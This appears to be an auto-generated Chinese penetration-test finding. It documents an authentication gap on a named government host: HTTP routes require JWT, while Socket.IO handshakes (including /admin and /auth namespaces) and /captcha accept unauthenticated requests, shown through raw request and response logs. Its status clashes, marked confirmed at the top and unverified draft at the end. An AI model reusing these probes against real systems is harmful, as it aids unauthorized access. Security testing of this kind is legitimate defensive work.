# POC/EXP — 4004 authServer Web/Socket.IO 鉴权层不一致漏洞

> 漏洞ID: `182df1e4-ab82-4705-b61c-1b8546886516`  | 嚴重度: **high** | 狀態: confirmed | 目標: `https://epcr.tpf.gov.tw:4004/ 全部端点（Web + Socket.IO + /captcha）`

**類型**: 鉴权配置错误 / Mixed Pattern

## 描述

4004 authServer 鉴权层出现严重的 mixed pattern 不一致：Web 端点（/version, /config, /health, /api/login）均通过 express-jwt 中间件严格鉴权（返回 401 "No authorization token was found"），但 Socket.IO 端点 + /captcha 完全无鉴权。这种不一致使得攻击者可绕过 HTTP 鉴权层，通过未受保护的入口（Socket.IO + /captcha）进行攻击，是典型的鉴权层配置错误。

## 前置條件

无（无需任何凭证）

## POC / 復現步驟

```
--- retest 2026-08-31 ---
2026-08-31 15:07 CST 本机复测（握手级，未投递业务事件洪水）：

【Web express-jwt — 全部 401】
GET /version /config /health /api/login
→ 401 HTML "No authorization token was found"
→ 同一 ETag W/"b7-kloRtePNJdI0rdqUwM/x3w"
→ 即便 401 仍 Set-Cookie connect.sid（express-session 在 JWT 之前/并行下发）

【Socket.IO — 无 JWT】
GET /socket.io/?EIO=4&transport=polling → 200
  97:0{"sid":"cxSpWSRWnr3AZyQGAAAJ","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":60000}2:40
?ns=/admin → 200 sid QSXNYfyjJhm7B-D-AAAK
?ns=/auth  → 200 sid z6Z4eAuo7vu4ULCWAAAL
（query ns= 不一定真正 join 命名空间，但握手不要求 JWT）
Upgrade websocket → HTTP 101 Switching Protocols

【/captcha — 无 JWT】
GET /captcha → 200 application/octet-stream GIF89a 17646B + connect.sid

【未做】
未重跑 sio_4004_ws.py 业务事件投递（既有记录为 silent timeout）。今日只验证鉴权边界。

【定性】
mixed pattern 成立：express-jwt 盖住部分 HTTP 路由，未盖 Socket.IO 与 /captcha。
这是鉴权配置不一致。实际利用面要分开看：/captcha 无认证在登录场景常见，但配合 /login 全局 TypeError 仍是未保护入口；Socket.IO 可无 JWT 拿 SID/升 WS，业务事件是否可执行以既有 silent-timeout 记录为准，不能写成已拿到 auth 数据。

步骤 1：Web 端点鉴权测试（全部 401）
GET /version → 401 "No authorization token was found"
GET /config → 401 "No authorization token was found"
GET /health → 401 "No authorization token was found"
GET /api/login → 401 "No authorization token was found"
W/"b7-kloRtePNJdI0rdqUwM/x3w" etag 指纹表明使用统一的 express-jwt 中间件模板

步骤 2：Socket.IO 端点鉴权测试（全部 200 + SID）
GET /socket.io/?EIO=4&transport=polling → 200 OK + SID UNh1o27A0OKrUUsAAAAC
GET /socket.io/?EIO=4&transport=websocket → 101 Switching Protocols
GET /socket.io/?EIO=4&transport=polling&ns=/admin → 200 OK + SID B37gszvJ7UtTYTaTAAAG
GET /socket.io/?EIO=4&transport=polling&ns=/auth → 200 OK + SID wRPqtT0JsxPmzQEZAAAH
（共 9 个 NS 变体全部接受 SID）

步骤 3：/captcha 端点鉴权测试（200 OK）
GET /captcha → 200 OK + GIF89a 17646B + connect.sid

步骤 4：鉴权层对比
-Web 端点：express-jwt 中间件（401 + W/ etag 指纹）
- Socket.IO 端点：未继承 express-jwt
- /captcha：未继承 express-jwt

结论：express-jwt 中间件仅覆盖了部分路由（/version, /config, /health, /api/login），未覆盖 Socket.IO 和 /captcha
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
